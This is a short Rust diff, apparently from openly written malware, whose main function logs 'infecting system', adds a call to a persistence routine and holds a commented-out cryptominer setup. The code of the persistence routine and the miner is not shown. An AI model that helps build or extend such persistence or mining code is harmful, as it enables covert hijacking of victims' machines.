@@ -14,9 +14,12 @@ use log::{info, warn};
 fn main() -> Result<(), Box<dyn std::error::Error>> {
     Builder::from_env(Env::default().default_filter_or("info")).init();
 
+
     match mutex::lock() {
         Some(_) => {
             info!("infecting system");
+
+            persistance::init();
 
             /*
             let miner = Miner::new();
